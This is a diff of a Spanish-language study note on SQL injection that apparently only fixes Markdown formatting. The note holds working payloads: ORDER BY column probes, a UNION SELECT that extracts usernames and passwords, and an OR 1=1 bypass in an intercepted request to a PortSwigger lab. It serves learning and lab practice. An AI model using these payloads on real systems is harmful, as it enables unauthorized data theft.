@@ -43,18 +43,21 @@ Permite entrar a una cuenta sin contraseña.
 
 ### 2. Detección de Columnas (UNION Based)
 Para saber cuántas columnas tiene la tabla actual.
+
 ```SQL
 
 ' ORDER BY 1--
 ' ORDER BY 2--
-' ORDER BY 3--```
+' ORDER BY 3--
+```
 
 ### 3. Extracción de Datos
 Una vez sabemos el número de columnas, extraemos información sensible.
+
 ```SQL
 
-' UNION SELECT NULL, username, password FROM users--```
-
+' UNION SELECT NULL, username, password FROM users--
+```
 ## 🛠️ Intercepción con Burp Suite
 
 Para ataques de SQL Injection más avanzados, no basta con el navegador. Necesitamos una herramienta de tipo **Interception Proxy** como **Burp Suite**.
@@ -67,27 +70,26 @@ Para ataques de SQL Injection más avanzados, no basta con el navegador. Necesit
 4. **Uso del Repeater:** Si un payload no funciona a la primera, enviamos la petición al *Repeater* (Ctrl + R). Esto nos permite modificar el SQL y reenviarlo una y otra vez sin tener que recargar la página manualmente.
 
 ### Ejemplo de petición interceptada:
+
 ```http
 GET /filter?category=Gifts' +OR+1=1-- HTTP/1.1
 Host: ace11f211fef.web-security-academy.net
-Cookie: session=xyz123...```
-
+Cookie: session=xyz123...
+```
 **En este ejemplo, interceptamos el parámetro category y añadimos nuestro payload de bypass.**
 
 ## 🛠️ Recursos
 
 Estos son los sitios que utilizo para practicar y profundizar:
 
-[Mi video de Youtube sobre **SQLInjection**] <(https://youtu.be/ffgYhkk8CCw?si=Yu8xhrxB8Oh-741V)>
+Mi video de Youtube sobre **SQLInjection** <https://youtu.be/ffgYhkk8CCw?si=Yu8xhrxB8Oh-741V>
 
-[PortSwigger Academy]<(https://portswigger.net/web-security)> El mejor lugar para laboratorios gratuitos y profesionales.
+PortSwigger Academy <https://portswigger.net/web-security> El mejor lugar para laboratorios gratuitos y profesionales.
 
-[PayloadsAllTheThings]<(https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md)> Repositorio de referencia para buscar payloads avanzados. 
+PayloadsAllTheThings <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md> Repositorio de referencia para buscar payloads avanzados. 
 
-[OWASP SQL Injection Guide]<(https://owasp.org/www-project-top-ten/)> Documentación técnica oficial.
+OWASP SQL Injection Guide <https://owasp.org/www-project-top-ten/> Documentación técnica oficial.
 
 ⚠️ Aviso de Ética: Estos apuntes tienen fines educativos y de seguridad defensiva. Nunca utilices estas técnicas en sistemas sin autorización previa. 
 
 **Post creado por Jaki para la comunidad quaker :v**
-
-
